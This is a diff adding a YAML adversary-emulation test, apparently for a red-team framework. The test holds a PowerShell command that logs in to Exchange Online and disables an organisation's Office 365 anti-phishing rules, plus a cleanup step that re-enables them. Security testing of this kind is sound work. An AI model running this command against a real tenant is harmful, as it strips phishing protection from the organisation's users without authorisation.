@@ -1,0 +1,28 @@
+---
+- id: c6d6e157f9ff496abfed129dda16fe13
+  name: office-365-Disable-AntiPhishRule
+  description: 'Using the Disable-AntiPhishRule cmdlet to disable antiphish rules
+    in your office-365 organization.
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    unknown:
+      psh:
+        command: $secure_pwd = "None" | ConvertTo-SecureString -AsPlainText -Force;
+          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList
+          "None", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test =
+          Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false;
+          Get-AntiPhishRule
+        payloads: []
+        cleanup: if("None" -ne "") {; $secure_pwd = ("None" + "") | ConvertTo-SecureString
+          -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential
+          -ArgumentList "None", $secure_pwd; Connect-ExchangeOnline -Credential $creds;
+          $test = Get-AntiPhishRule; Enable-AntiPhishRule -Identity $test.Name -Confirm:$false;
+          Get-AntiPhishRule; }
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
